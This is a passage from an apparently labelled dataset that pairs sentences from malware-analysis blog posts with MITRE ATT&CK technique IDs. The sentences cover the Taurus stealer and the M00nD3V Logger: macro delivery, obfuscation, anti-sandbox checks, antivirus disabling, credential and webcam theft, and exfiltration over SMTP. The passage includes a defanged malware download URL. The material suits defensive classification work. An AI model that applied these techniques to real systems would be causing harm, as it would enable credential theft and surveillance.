"labels": ["T1204"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "| **Defense Evasion** | [T1027: Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/)  |", "labels": ["T1027"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "| **Credential Access**  | [T1555: Credentials from Password Stores](https://attack.mitre.org/techniques/T1555/)   |", "labels": ["T1555"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "| **Discovery** | [T1082 System Information Discovery](https://attack.mitre.org/techniques/T1082/)  |", "labels": ["T1082"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "| **Collection** | [T1005: Data from Local System](https://attack.mitre.org/techniques/T1005/)  |", "labels": ["T1005"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "| **Command and Control** | [T1132: Data Encoding](https://attack.mitre.org/techniques/T1132/)", "labels": ["T1132"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "[T1105: Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)", "labels": ["T1105"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "[T1572: Protocol Tunneling](https://attack.mitre.org/techniques/T1572/)  |", "labels": ["T1572"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "| **Exfiltration** | [T1041: Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/)", "labels": ["T1041"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "[T1020: Automated Exfiltration](https://attack.mitre.org/techniques/T1020/) |", "labels": ["T1020"], "document": "quoteintelligence_2021-01-06_reconhellcat-uses-nist-theme-as"}, {"sentence": "Taurus: The New Stealer in Town", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "One of the newest ones we observed, Taurus, includes techniques to evade\u00a0sandbox detection.", "labels": ["T1497"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "Let's take a closer look at the Taurus stealer.", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "During our research, we observed that the \"Predator the Thief\"\u00a0cybercriminal group is behind the development of this stealer, named Taurus,\u00a0and is selling it on dark forums for $100\u00a0or rebuilt\u00a0with a new domain for $20.", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "The group selling Taurus claims\u00a0that this stealer is capable of stealing passwords, cookies, and autofill forms along with the history of Chromium- and Gecko-based browsers.", "labels": ["T1539", "T1555"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "Taurus\u00a0can also steal some popular cryptocurrency wallets, commonly used FTP clients credentials, and email clients credentials.", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "This stealer\u00a0also collects information, such as installed software and system configuration, and sends that information\u00a0back to the attacker.", "labels": ["T1082", "TA0010"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "Taurus is designed to not execute in countries within the Commonwealth of Independent States (CIS), which includes Azerbaijan, Armenia, Belarus, Georgia, Kazakhstan, Kyrgyzstan, Moldova, Russia, Tajikistan, Turkmenistan, Uzbekistan, and Ukraine.", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "![Infection cycle](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/infection%20(1)_0.png)", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "*Figure 1: Infection cycle of the Taurus campaign*", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "While tracking the campaign, we noticed that attackers initiated this campaign by sending a spam mail to the victim containing a malicious attachment.", "labels": ["T1566"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "Below are the details of the spam mail we observed:", "labels": ["T1566"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "The attachment (pay-violation1011066.doc) contained\u00a0malicious macro code to download further payloads.", "labels": ["T1566", "T1105", "T1059"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "![Doc file](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/doc%20file.PNG)", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "*Figure 2: The attached malicious doc asks users\u00a0to enable a macro.*", "labels": ["T1566", "T1204"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "Once\u00a0the document is opened, it prompts the user to enables the macro.", "labels": ["T1204"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "Once the content is enabled, an AutoOpen() subroutine is called, which\u00a0will run the malicious Visual Basic for Applications\u00a0(VBA) macro wherein a PowerShell script is executed via BitsTransfer,\u00a0downloads three different files of the\u00a0**Taurus Project** from the Github site, then\u00a0saves them in a\u00a0Temp folder with predefined names.", "labels": ["T1059", "T1059", "T1105"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "![obfuscated macro](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/Obfuscated%20macro%20code.PNG)", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "*Figure 3: The obfuscated VBA macro code*", "labels": ["T1027", "T1059"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "The macro contains the URL of the payload as a combination of the following obfuscations: Base64 encoded and reversed string.", "labels": ["T1059", "T1027"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "![Decypted powershell](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/decryptd%20powershell.PNG)", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "*Figure 4: The decrypted PowerShell script used to download\u00a0the payload.*", "labels": ["T1059"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "Further, these three files get downloaded from Github and dropped in the %Temp% directory.", "labels": ["T1105"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "3.**wsNcf.com** \u2192 saved with the name **\u201cwsNcf.com\u201d** \u2192 Taurus Stealer", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "Here, PowerShell is using the Certutil.exe command to decode the payload and execute it on the victim's machine.", "labels": ["T1059", "S0160"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "The Twitter handle\u00a0[@3xp0rt](https://twitter.com/3xp0rtblog/status/1254079067810336768),\u00a0which exposes\u00a0documents from a Russian hacking forum, shows some of the claims of the Taurus project.", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "![Tauras Project claim about stealing ability of malware](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/taurus%20project%20message.PNG)", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "*Figure 5: The Taurus project claims to have the stealing ability of malware.*", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "The author claims that Taurus\u00a0has the following stealing capabilities:", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "* Stealing cookies, Auto-form details, browsing history, and credit card information from Chromium-\u00a0and Gecko-based browsers.", "labels": ["T1539", "T1555"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "* Cookies and passwords from Microsoft\u00a0Edge browsers.", "labels": ["T1539"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "* Credential stealing of some cryptocurrency wallets, including Electrum, MultiBit, Ethereum, Jaxx Liberty, Bytecoin, Atomic, and Exodus", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "* Stealing credential of FTP clients, including FileZilla, WinFTP, and WinSCP", "labels": ["TA0006"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "* Stealing session files from applications, including Discord, Steam, Telegram, and Authy", "labels": ["T1528"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "* Collects system information, such as\u00a0system configuration and list of installed software.", "labels": ["T1518"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "![Taurus panel](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/panel.PNG)", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "*Figure 6: The\u00a0[Taurus login panel](https://www.virustotal.com/gui/file/4a30ef818603b0a0f2b8153d9ba6e9494447373e86599bcc7c461135732e64b2/detection).*", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "The Taurus project has also built a dashboard where the attacker can keep an eye on the infection counts according to geolocations.", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "![geolocation](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/dashboard%20of%20Taurus.PNG)", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "*Figure 7: The Taurus d[ashboard](https://twitter.com/MalwareInt/status/1257838534993621002/photo/3) to see infection count according to geolocation.*", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "This dashboard also provides the attacker with the ability\u00a0to customize the configuration of Taurus.", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "![dashboard to config](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/dashboard%20to%20set%20config.PNG)", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "*Figure 8: The attacker can update the configuration of Taurus in the [dashboard](https://twitter.com/3xp0rtblog/status/1254079343581675525/photo/2).*", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "Once PowerShell downloads the three different files from the GitHub repository, it uses the utility \u201cCertutil.exe\u201d to decode the payload.", "labels": ["T1059", "S0160"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "Then, Certutil.exe decrypts the second file, which is a Base64-encoded AutoIT file having a certificate as a header.", "labels": ["S0160"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "This AutoIT file will decrypt the third file, which is the Taurus Stealer.", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "After deobfuscating the AutoIT\u00a0script, we noticed that it has multiple anti-sandbox techniques.", "labels": ["T1497"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "It checks for the Sleep patch in the sandbox using the GetTickCount function.", "labels": ["T1497"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "![Anti-sandbox patch with GetTickCount Api](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/Anti-sandbox%20patch%20with%20GetTickCount%20Api.png)", "labels": ["T1497"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "*Figure 9: The anti-sandbox patch with the GetTickCount API.*", "labels": ["T1497"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "![Multiple check for files, computer name & internet connectivity](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/Multiple%20check%20for%20files%2C%20computer%20name%20%26%20internet%20connectivity.png)", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "*Figure 10: Taurus performs multiple checks for files, the computer name, and internet connectivity.*", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "Finally, the AutoIT\u00a0script reads and decodes the **wsNcf.com** file, then loads the deobfuscated shellcode for injecting the decoded payload into dllhost.exe.", "labels": ["T1140", "T1055"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "![Building path for dllhost.exe](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/Autoit%20dllhost.PNG)", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "Figure 12 shows\u00a0details of the deobsfucated shellcode, which will inject the payload.", "labels": ["T1140", "T1055"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "![Shellcode checking for executable to inject in dllhost.exe](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/Shellcode%20checking%20for%20executable%20to%20inject%20in%20dllhost.exe_.png)", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "*Figure 12: The shellcode checking for the executable to inject in the dllhost.exe.*", "labels": ["T1055"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "Before starting the actual activity of the stealer, the malicious program is started by loading configuration into memory step by step.", "labels": ["T1055"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "![Storing config into memory](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/Storing%20config%20into%20memory.png)", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "![System information fetched by stealer](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/System%20information.PNG)", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "![Zipped all the stolen data](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/zip%20file%20contains%20all%20stealed%20data.PNG)", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "After zipping all the stolen data, the malicious program tries to send that data to a Command and Control (C&C) server\u00a0after building the URL at run time, which is also pre-defined in the malicious program (Ofcourse XORed).", "labels": ["TA0011", "TA0011"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "![URL building](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/URI%20building2.PNG)", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "*Figure 16: The URL building to send the stolen data to the C&C.*", "labels": ["TA0011"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "![Cloud Sandbox detection](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/sandbox%20activity.PNG)", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "| T1064 | Macros in document used for code execution.", "labels": ["T1059"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "| T1086 | PowerShell commands to execute payloads |", "labels": ["T1059"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "| T1132 | Data Encoding |", "labels": ["T1027"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "| T1020 | Automated Exfiltration |", "labels": ["T1020", "T1020"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "| T1003 | Credential Dumping |", "labels": ["TA0006"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "| T1503 | Credentials from Web Browser |", "labels": ["T1555"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "| T1539 | Steal Web Session Cookie |", "labels": ["T1539"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "| T1518 | Software Discovery |", "labels": ["T1518"], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "221BBAC7C895453E973E47F9BCE5BFDC - **Encrypted Taurus Stealer**", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "5E3EA2152589DF8AE64BA4CBB0B2BD3B - **Decrypted Taurus Stealer**", "labels": [], "document": "zscaler_2020-06-26_taurus-new-stealer-town"}, {"sentence": "Deep Dive Into the M00nD3V Logger", "labels": [], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "ThreatLabZ observed a **multifunctional** information-stealing Trojan named \"**M00nD3V Logger''** that is being dropped by a multistage loader.", "labels": [], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "Due to its multiple stealing features,\u00a0**M00nD3V Logger** has\u00a0gradually gained popularity on hacking forums.", "labels": ["TA0010"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "Recently [Blueliv](https://www.blueliv.com/cyber-security-and-cyber-threat-intelligence-blog-blueliv/covid-19-cybercrime-m00nd3v-hawkeye-malware-threat-actor/) published a blog discussing the relationship of M00nD3V with the HawkEye stealer, along with information about the bad actor selling M00nD3V.", "labels": [], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "Aside from\u00a0keystroke logging, the M00nD3VLoggerhas the ability to steal confidential information such as browser passwords, FTP client\u00a0passwords, email client\u00a0passwords, DynDNS credentials, JDownloader credentials and capture Windows Keystrokes, as well as gain\u00a0access to the webcam and hook the clipboard.", "labels": ["T1056", "T1056", "TA0009", "T1555", "TA0006", "T1125", "T1115"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "In all, it\u00a0has the ability to steal passwords from 42 applications.", "labels": ["TA0006"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "M00nD3VLogger\u00a0is also equipped with other major functionality,\u00a0including a botkiller, an antivirus killer, communicating over SMTP/FTP/proxy, downloading additional plugins, and the BouncyCastle crypto package.", "labels": ["T1562", "T1071", "T1105"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "During our research, we found M00nD3V was delivered via spam mail or through a compromised website that drops a payload on the victim's machine.", "labels": ["T1189"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "One such spam mail claims to be from \"Hyundai Heavy Industries Co., Ltd\"\u00a0regarding a bid\u00a0on a project for Qatargas.", "labels": ["T1566"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "The spam mail includes zip attachments that contain malicious executables.", "labels": ["T1566"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "*Figure 2: Spam\u00a0Mail*", "labels": ["T1566"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "*Figure 3: M00nD3V Logger subscription and payment method pages.*", "labels": [], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "In this blog, we will provide a detailed technical analysis of commercial M00nD3V\u00a0Logger\u00a0malware.", "labels": [], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "Delivering malware without triggering any suspicious activity while blending into an existing benign Windows process makes detection a bit harder.", "labels": ["T1055"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "Here, the M00nD3V malware does one such trick to deliver its payload without getting easily noticed.", "labels": [], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "*Figure 4: The M00nD3V malware register\u00a0running with RegAsm.exe*\u00a0-\u00a0*Microsoft utility.*", "labels": ["T1218"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "The\u00a0malware also runs by elevating its own privileges.", "labels": ["TA0004"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "The malware unpacks the encrypted payload using multibyte XOR decryption.", "labels": ["T1140"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "While unpacking, the malware also uses null bytes in the XOR key.", "labels": ["T1140"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "*Figure 5: First-level decryption using multibyte XOR.*", "labels": ["T1140"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "Even though key length is 24, the malware uses only the first 16 bytes to decrypt the resource section of the encrypted data.", "labels": ["T1140"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "The above decryption\u00a0routine results\u00a0in a .NET\u00a0PE file.", "labels": ["T1140", "T1059"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "In this dumped file,\u00a0there is also a similar XOR routine to decrypt the data but with a different key to run the final payload.", "labels": ["T1140"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "StubConfig Class contains the configuration details - some of them are initialized with Base64 values while others are hardcoded.", "labels": ["T1140"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "Before starting to log user data, the M00nD3V Logger initializes its configuration.", "labels": ["T1056"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "The initialization phase includes several checks, such as an anti-debugger, a bot killer, an antivirus killer, and more.", "labels": ["T1497", "T1562"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "* DependencyLoader - Downloads the DLL from m00nd3v[.]com/M00nD3v/Decryption/BouncyCastle[.]Crypto.dll and loads it in memory.", "labels": ["T1105"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "* Persistence - Copies\u00a0the parent file to AppData directory and begins the startup entry [SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run].", "labels": ["TA0003", "T1037"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "* Antidebugger - Checks to see if any of the following processes are running:\u00a0SbieDll.dll, Wireshark, Winsock Packet Editor.", "labels": ["T1497"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "* Antivirus killer -\u00a0Uses Image File Execution Options (IFEO) to interfere with the\u00a0executables shown in Figure 10.", "labels": ["T1562", "T1562"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "By modifying the registry entry\u00a0 [Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\], the malware attaches rundll32.exe as debugger to each of the executables.", "labels": ["T1562"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "This way, it disables all the listed applications to run.", "labels": ["T1562"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "* Process elevation -\u00a0As shown in Figure 11,\u00a0the malware contains a process elevation module, which is responsible for elevating\u00a0the privilege of the malware executable.", "labels": ["TA0004", "TA0004"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "Before starting to log the stored credentials and other personal data, it checks whether the malware was previously installed or not on the victim's machine by looking for a specific file name\u00a0with a combination of Processor Id and Volume Serial Number in the\u00a0temp directory.", "labels": ["T1005"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "The malware has three kinds of communication methods to send logged data: SMTP, FTP, and proxy.", "labels": ["T1090"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "But this stub is configured to use only and send data over SMTP only.", "labels": ["T1041"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "If the value is not set in config, then it won't execute the \"keystroke functionality\".", "labels": ["T1056"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "As shown in Figure 14, the Stub is configured to execute the keystroke but not the webcam as the webcam value is not assigned.", "labels": ["T1056"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "The Stub starts its core stealing functionality by sending full victim machine information, as shown in Figure 15**,** to the attacker over SMTP port 587", "labels": ["T1041"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "*Figure 15: Basic machine information sent to the attacker.*", "labels": ["T1041"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "The malware communicates with the attacker over SMTP using port 587.", "labels": ["T1071"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "The malware\u00a0crafts\u00a0an\u00a0email with the captured details shown\u00a0in Figure 16\u00a0and sends\u00a0it to the attacker.", "labels": ["T1071"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "The attackers use \"**smtp.privateemail.com\"**\u00a0service to transfer the captured data.", "labels": ["T1041"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "*Figure 16: Information sent via SMTP.*", "labels": ["T1041"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "The **LogTypeName** mentioned below is used to tag the data\u00a0to inform the attacker what module it is running currently.", "labels": ["TA0011"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "While uploading data over FTP, it first converts plain text data to bytes and creates FTP requests by configuring all the FTP request fields (i.e., ftp\\_host, credentials, method).", "labels": ["T1041", "T1071"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "The FTP method used to upload files is \"STOR\".", "labels": ["T1071"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "*Figure 18: Communicaiton via FTP.*", "labels": ["T1071"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "The malware sets the proxy URL from the config class and uploads the below-mentioned data using the POST method.", "labels": ["T1090"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "*Figure 19: Communication via proxy.*", "labels": ["T1090"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "**Password stealer:** M00nD3V Logger has the capability to steal passwords and cookies from all possible browsers and email clients, as well as FTP clients.", "labels": ["T1555"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "The collected passwords are sent to the attacker over SMTP.", "labels": ["T1041"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "*Figure 23: The collected passwords sent over SMTP.*", "labels": ["T1041"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "The malware has the capability to secretly access the device's webcam and capture the image.", "labels": ["T1125"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "The malware copies the captured image onto the clipboard, extracts the image from clipboard, then\u00a0saves it in the temp directory.", "labels": ["T1115"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "To send stolen images over SMTP, it reads the image path and attaches the .bmp image as an email attachment with a\u00a0personalize the subject line, such\u00a0as \"**Dear M00nD3v user Please find the attachment of Webcam. Regards M00nD3v\"**", "labels": ["T1041", "T1041"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "Similarly, the other modules\u00a0named keystrokes, clipboard, and screen sender, execute with individual threads and send stolen data to the attacker, then sleep for some period of time before repeating the same stealing process.", "labels": ["T1056", "T1115", "T1113", "TA0010"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "*Figure 24:\u00a0The Zscaler Cloud Sandbox report for the\u00a0M00nD3V Logger.*", "labels": [], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "| T1503 | Credentials from Web Browsers |", "labels": [], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "| T1112 | Modify Registry |", "labels": ["T1112"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "| T1060 | Persistence |", "labels": ["TA0003"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "| T1057 | Process Discovery |", "labels": ["T1057", "T1057"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "| T1105 | Remote File Copy |", "labels": ["T1105"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "| T1497 | Defense Evasion, Discovery |", "labels": ["T1497"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "| T1083 | File and Directory Discovery |", "labels": ["T1083", "T1083"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "| T1089 | Disabling Security Tools |", "labels": [], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "| T1055 | Process Injection |", "labels": ["T1055"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "| T1548 | Abuse Elevation Control Mechanism |", "labels": ["T1548"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "| T1115 | Clipboard Data |", "labels": ["T1115"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "| T1113 | Screen Capture |", "labels": ["T1113"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "| T1125 | Video Capture |", "labels": ["T1125"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "| T1056 | Input Capture |", "labels": ["T1056"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "| T1048 | Exfiltration Over Alternative Protocol |", "labels": ["T1048"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "| T1183 | Image File Execution Options Injection |", "labels": [], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "**C&C:**", "labels": ["TA0011", "TA0011", "TA0011"], "document": "zscaler_2020-07-10_deep-dive-m00nd3v-logger"}, {"sentence": "New Voicemail-Themed Phishing Attacks Use Evasion Techniques and Steal Credentials", "labels": ["T1566", "TA0006"], "document": "zscaler_2020-07-17_new-voicemail-themed-phishing-attacks"}, {"sentence": "Through the intelligence gathered from the Zscaler cloud, we discovered several newly registered domains that use VoIP and 